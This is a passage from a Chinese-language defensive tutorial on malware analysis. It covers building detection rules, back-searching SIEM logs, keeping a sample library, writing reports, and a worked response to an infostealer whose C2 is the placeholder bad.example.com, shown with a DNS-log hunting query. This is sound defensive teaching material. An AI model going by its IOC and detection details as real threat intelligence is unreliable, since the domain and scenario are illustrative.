样本 → 行为提取 → YARA/Sigma 规则 → 接入 EDR/SIEM → 回溯历史数据 → 确认影响面
```

关键是最后一步「**回溯**」：拿到新 IOC 后，立刻在历史日志里查有没有出现过——很多入侵是这时候才发现的。

```sql
-- 示意：在 SIEM 里回溯
SELECT host, user, time FROM dns_logs
WHERE domain IN ('bad.example.com') AND time > now() - 90d;
```

## 四、团队级样本库怎么建

| 内容 | 说明 |
| --- | --- |
| 样本存储 | 按 SHA256 命名，只读，带采集信息 |
| 元数据 | 首次发现时间、来源、家族、标签、关联事件 |
| 规则库 | YARA 按家族/行为分类，版本管理 |
| 报告库 | 每份报告可检索（按家族、TTP、IOC） |
| 复盘记录 | 误判案例同样入库（负样本同样宝贵） |

**样本库的价值在「可检索」**：下次遇到相似样本，能立刻找到上次的结论。

## 五、报告写作的四个要点

1. **结论先行**：第一段就说「这是什么、有多严重、建议做什么」
2. **证据可复现**：每条行为都附命令或截图，别人能照做
3. **区分事实与推断**：写「观察到 X」与「推测是 Y」要分开
4. **给出可执行建议**：不要写「加强防护」，要写「封禁域名 X、检查主机 A 的 4688 事件」

## 六、一次完整的处置闭环

```
① 发现：EDR 告警某主机执行可疑 PowerShell
② 分析：提取命令行 → 定位落地文件 → 沙箱跑行为
③ 判定：确认为窃密木马，C2 为 bad.example.com
④ 处置：隔离主机、封禁域名、重置相关凭据
⑤ 回溯：全量 DNS 日志查该域名，发现另外 3 台
⑥ 加固：补检测规则、更新 YARA、培训钓鱼识别
⑦ 复盘：为什么没在第一步拦住（是规则缺失还是没开日志）
```

**第 ⑦ 步最有价值**：它决定了下次能不能更早发现。

## 七、常见问题

| 问题 | 后果 |
| --- | --- |
| 只写「疑似木马」 | 无法处置 |
| IOC 不标有效期 | 半年后还在封已失效的域名 |
| 不回溯历史日志 | 漏掉同批受害主机 |
| 不更新规则 | 同族变种再来一次还是抓不到 |
| 报告不写误判 | 团队重复踩坑 |

## 八、练习

1. 给一个教学样本写一份完整报告（按上面八段）
2. 把它的 IOC 分成四级，并说明每级的处置动作
3. 假设你是防守方，写出「拿到这份报告后 24 小时内要做的 5 件事」

## 一句话总结

样本分析的终点不是「看懂这一个」，而是**沉淀成规则、情报与流程**，让下一个样本被更早拦住。
</script>
